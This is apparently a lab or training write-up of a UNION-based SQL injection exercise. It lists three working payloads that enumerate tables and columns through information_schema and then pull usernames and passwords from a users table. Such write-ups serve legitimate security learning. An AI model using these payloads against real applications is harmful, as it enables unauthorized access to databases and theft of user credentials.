# SQL Injection Attack, Listing the Database Contents on Non-Oracle Databases

## Vulnerability
SQL Injection (SQLi)

## Objective
Enumerate database tables and columns, then retrieve sensitive user data.

## Steps

1. Determined the number of columns using UNION attacks.
2. Identified columns that accept string data.
3. Retrieved table names using:

```sql
' UNION SELECT table_name, NULL FROM information_schema.tables--
```

4. Located the users table.
5. Retrieved column names using:

```sql
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_xxxxx'--
```

6. Identified username and password columns.
7. Extracted user credentials using:

```sql
' UNION SELECT username_xxxxx, password_xxxxx FROM users_xxxxx--
```

## Impact

An attacker can enumerate the database structure and extract sensitive information such as usernames and passwords.

## Result

Successfully listed database contents and retrieved user credentials.
